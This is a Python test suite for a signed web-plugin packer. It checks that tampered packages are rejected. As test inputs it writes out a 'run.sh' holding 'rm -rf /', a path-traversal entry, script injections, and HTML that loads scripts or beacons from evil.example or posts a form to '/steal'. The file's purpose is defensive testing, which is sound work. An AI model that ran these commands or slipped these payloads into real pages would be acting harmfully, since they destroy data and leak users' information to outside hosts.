"""Phase 2 tests: reproducible packing, and every kind of tampering is rejected."""
import io
import json
import shutil
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))
import keys  # noqa: E402
import pack  # noqa: E402

SEED = bytes(range(32))          # a fixed TEST key; never used for real plugs
OTHER = bytes(range(1, 33))
HELLO = ROOT / "examples" / "hello"


def entries(data):
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        return [(i.filename, z.read(i)) for i in z.infolist()]


def rezip(items):
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as z:
        for name, b in items:
            z.writestr(name, b)
    return out.getvalue()


def edit(data, name, fn):
    return rezip([(n, fn(b) if n == name else b) for n, b in entries(data)])


class Pack(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.plug = pack.build(HELLO, SEED)

    def test_good_plug_verifies(self):
        manifest, files = pack.verify(self.plug)
        self.assertEqual(manifest["id"], "zone.work.hello")
        self.assertEqual(manifest["author_key"], keys.public_key_str(SEED))
        self.assertIn("index.html", files)

    def test_reproducible(self):
        self.assertEqual(pack.build(HELLO, SEED), self.plug)

    def test_different_key_different_file(self):
        self.assertNotEqual(pack.build(HELLO, OTHER), self.plug)

    def test_every_single_byte_flip_is_caught(self):
        """Flip each byte of the file in turn. None may verify. (The strongest tamper test.)"""
        step = 1                               # every byte, no sampling
        for i in range(0, len(self.plug), step):
            bad = bytearray(self.plug)
            bad[i] ^= 0x01
            with self.subTest(offset=i):
                with self.assertRaises(ValueError):
                    pack.verify(bytes(bad))


class Tampering(unittest.TestCase):
    """Each attack, done properly (a valid zip), must be rejected for the right reason."""

    @classmethod
    def setUpClass(cls):
        cls.plug = pack.build(HELLO, SEED)

    def check(self, data, reason):
        with self.assertRaises(ValueError) as cm:
            pack.verify(data)
        self.assertIn(reason, str(cm.exception))

    def test_changed_app_file(self):
        self.check(edit(self.plug, "app/index.html", lambda b: b.replace(b"Hello", b"Hacked")), "was changed")

    def test_changed_manifest_permission(self):
        def widen(b):
            m = json.loads(b)
            m["permissions"]["network"] = ["evil.example"]
            return pack._canon(m)
        self.check(edit(self.plug, "plug.json", widen), "signature does not match")

    def test_resigned_by_someone_else(self):
        """Attacker swaps in their own key and re-signs: signature is valid, but the key changed.
        verify() still passes (it's a valid plug by a DIFFERENT author); the socket must pin keys.
        This test documents that: the author_key reported must be the attacker's, not ours."""
        m, _ = pack.verify(pack.build(HELLO, OTHER))
        self.assertNotEqual(m["author_key"], keys.public_key_str(SEED))

    def test_extra_file(self):
        self.check(rezip(entries(self.plug) + [("app/evil.js", b"alert(1)")]), "do not match build.json")

    def test_missing_file(self):
        self.check(rezip([e for e in entries(self.plug) if e[0] != "app/index.html"]), "do not match build.json")

    def test_missing_signature(self):
        self.check(rezip([e for e in entries(self.plug) if e[0] != "signature"]), "missing signature")

    def test_duplicate_entry(self):
        items = entries(self.plug)
        with self.assertWarns(UserWarning):
            data = rezip(items + [("app/index.html", b"<script>evil()</script>")])
        self.check(data, "duplicate")

    def test_path_traversal(self):
        self.check(rezip(entries(self.plug) + [("../../evil.txt", b"x")]), "unsafe path")

    def test_unexpected_top_level(self):
        self.check(rezip(entries(self.plug) + [("run.sh", b"rm -rf /")]), "unexpected entries")

    def test_not_a_zip(self):
        self.check(b"hello", "not a readable zip")

    def test_zip_bomb(self):
        big = rezip(entries(self.plug) + [("app/big.bin", b"\0" * (pack.MAX_TOTAL + 1))])
        self.check(big, "too big")


class Refuse(unittest.TestCase):
    def test_bad_manifest_is_not_packed(self):
        with tempfile.TemporaryDirectory() as d:
            src = Path(d) / "p"
            shutil.copytree(HELLO, src)
            m = json.loads((src / "plug.json").read_text())
            m["permissions"]["camera"] = True
            (src / "plug.json").write_text(json.dumps(m))
            with self.assertRaises(ValueError):
                pack.build(src, SEED)

    def test_missing_entry_is_not_packed(self):
        with tempfile.TemporaryDirectory() as d:
            src = Path(d) / "p"
            shutil.copytree(HELLO, src)
            (src / "app" / "index.html").unlink()
            with self.assertRaises(ValueError):
                pack.build(src, SEED)

    def test_will_not_overwrite_a_different_plug(self):
        with tempfile.TemporaryDirectory() as d:
            out = Path(d) / "x.plug"
            out.write_bytes(b"someone else's plug")
            with self.assertRaises(SystemExit):
                pack.refuse_if_different(out, b"new")
            pack.refuse_if_different(out, b"new", force=True)          # allowed when asked
            pack.refuse_if_different(out, b"someone else's plug")      # identical = fine


class Inline(unittest.TestCase):
    def make(self, d, html, extra):
        src = Path(d) / "p"
        shutil.copytree(HELLO, src)
        (src / "app" / "index.html").write_text(html)
        for n, t in extra.items():
            (src / "app" / n).parent.mkdir(parents=True, exist_ok=True)
            (src / "app" / n).write_text(t)
        return src

    def test_inline_folds_local_files(self):
        with tempfile.TemporaryDirectory() as d:
            src = self.make(d, '<link rel="stylesheet" href="a.css"><script src="a.js"></script>',
                            {"a.css": "b{color:red}", "a.js": "var x=1"})
            m, files = pack.verify(pack.build(src, SEED, inline=True))
            self.assertEqual(list(files), ["index.html"])
            self.assertIn(b"b{color:red}", files["index.html"])
            self.assertIn(b"var x=1", files["index.html"])

    def test_inline_keeps_pictures_and_data(self):
        """Bug found running the desktop host: inline mode used to drop every file but the page,
        so pictures and WebAssembly went missing. Only folded scripts/styles may go."""
        with tempfile.TemporaryDirectory() as d:
            src = self.make(d, '<script src="a.js"></script><img src="img/b.svg">',
                            {"a.js": "var x=1", "img/b.svg": "<svg/>", "add.wasm": "\0asm"})
            m, files = pack.verify(pack.build(src, SEED, inline=True))
            self.assertEqual(sorted(files), ["add.wasm", "img/b.svg", "index.html"])

    def test_inline_refuses_remote(self):
        """Red-team #1: every way of quoting a remote reference must be refused."""
        sneaky = [
            '<script src="https://evil.example/x.js"></script>',
            "<script src='https://evil.example/x.js'></script>",
            "<script src=https://evil.example/x.js></script>",
            "<script src='//evil.example/x.js'></script>",
            "<SCRIPT SRC='HTTPS://EVIL.EXAMPLE/X.JS'></SCRIPT>",
            "<link rel='stylesheet' href='https://evil.example/x.css'>",
            "<img src='http://evil.example/beacon.gif'>",
            "<style>body{background:url(https://evil.example/b.png)}</style>",
            "<style>@import 'https://evil.example/x.css';</style>",
            "<a href='javascript:alert(1)'>x</a>",
            "<form action='https://evil.example/steal'></form>",
        ]
        for html in sneaky:
            with self.subTest(html), tempfile.TemporaryDirectory() as d:
                with self.assertRaises(ValueError):
                    pack.build(self.make(d, html, {}), SEED, inline=True)

    def test_inline_allows_data_and_local(self):
        with tempfile.TemporaryDirectory() as d:
            src = self.make(d, '<img src="data:image/png;base64,AAAA"><a href="#top">top</a><script src="a.js"></script>',
                            {"a.js": "var y=2"})
            pack.verify(pack.build(src, SEED, inline=True))


class NameTricks(unittest.TestCase):
    """Red-team #2, #3, #4: names and signatures must have exactly one form."""

    @classmethod
    def setUpClass(cls):
        cls.plug = pack.build(HELLO, SEED)

    def test_case_clash_in_zip(self):
        items = entries(self.plug)
        with self.assertRaises(ValueError) as cm:
            pack.verify(rezip(items + [("app/INDEX.html", b"x")]))
        self.assertIn("upper/lower case", str(cm.exception))

    def test_case_clash_when_packing(self):
        with tempfile.TemporaryDirectory() as d:
            src = Path(d) / "p"
            shutil.copytree(HELLO, src)
            (src / "app" / "A.js").write_text("1")
            (src / "app" / "a2.js").write_text("2")
            pack.build(src, SEED)                       # different names: fine
            self.assertIsNone(pack._case_clash(["app/A.js", "app/a2.js"]))
            self.assertEqual(pack._case_clash(["app/A.js", "app/a.js"]), "app/a.js")

    def test_unicode_names_refused(self):
        for bad in ["app/café.js", "app/café.js", "app/аpp.js", "app/a b.js", "app/.", "app/../x"]:
            with self.subTest(bad):
                self.assertFalse(pack._safe_name(bad))
        self.assertTrue(pack._safe_name("app/js/main.min.js"))

    def test_uppercase_signature_refused(self):
        items = [(n, b.upper() if n == "signature" else b) for n, b in entries(self.plug)]
        repacked = pack._zip(items[0][1], items[1][1],
                             {n[4:]: b for n, b in items if n.startswith("app/")}, items[-1][1])
        with self.assertRaises(ValueError) as cm:
            pack.verify(repacked)
        self.assertIn("canonical", str(cm.exception))


if __name__ == "__main__":
    unittest.main()
